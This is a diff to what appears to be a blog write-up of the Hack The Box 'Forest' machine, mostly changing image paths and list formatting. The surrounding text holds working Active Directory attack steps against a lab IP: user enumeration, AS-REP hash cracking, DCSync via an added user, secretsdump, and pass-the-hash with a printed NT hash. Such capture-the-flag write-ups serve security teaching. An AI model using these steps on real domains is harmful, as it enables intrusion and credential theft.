@@ -8,7 +8,7 @@ pin: false
 math: true
 mermaid: true
 image:
-  path: /assets/img/2024-11-16-writeup-htb-forest/Forest.png
+  path: /assets/img/htb/forest/tn.png
 ---
 
 ### Overview
@@ -172,14 +172,17 @@ nxc smb 10.129.30.97 -u '' -p '' --users
 ```
 
 We got back a few users:
-- Administrator
-- krbtgt
-- sebastien
-- lucinda
-- svc-alfresco
-- andy
-- mark
-- santi
+
+```
+Administrator
+krbtgt
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+```
 
 Let's note them somewhere and move on.
 
@@ -211,7 +214,7 @@ We can now try to crack it with hashcat:
 hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
 ```
 
-![](/assets/img/2024-11-16-writeup-htb-forest/cracked_hash_svcalfresco.png)
+![](/assets/img/htb/forest/cracked_hash_svcalfresco.png)
 
 Now that we have the password for `svc-alfresco`, let's try to login via winrm:
 
@@ -221,7 +224,7 @@ evil-winrm -i 10.129.30.97 -u svc-alfresco -p <PASSWORD>
 
 We successfully logged in and was able to retrieve the user flag at `C:\Users\svc-alfresco\Desktop\user.txt`
 
-![](/assets/img/2024-11-16-writeup-htb-forest/user_flag.png)
+![](/assets/img/htb/forest/user_flag.png)
 
 ### Privilege Escalation
 ___
@@ -236,7 +239,7 @@ zip -r data.zip *.json
 
 Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that `svc-alfresco`, through nested group memberships, is in the `Account Operators` group which has `GenericAll` privilege on the `Exchange Windows Permissions` group which then have the `WriteDacl` privilege over the domain object.
 
-![](/assets/img/2024-11-16-writeup-htb-forest/bloodhound.png)
+![](/assets/img/htb/forest/bloodhound.png)
 
 With this information, we can do the following:
 - Create a new domain user.
@@ -263,7 +266,7 @@ Now `hackerr` should have DCSync rights. We can verify by using using impacket's
 impacket-secretsdump htb.local/hackerr:'password123!'@10.129.30.97 -just-dc -outputfile dcsync.out
 ```
 
-![](/assets/img/2024-11-16-writeup-htb-forest/dcsync.png)
+![](/assets/img/htb/forest/dcsync.png)
 
 We can use the Administrator's NThash to login via `winrm`:
 
@@ -273,4 +276,4 @@ evil-winrm -i 10.129.30.97 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6
 
 We can then retrive the root flag.
 
-![](/assets/img/2024-11-16-writeup-htb-forest/root_flag.png)
+![](/assets/img/htb/forest/root_flag.png)
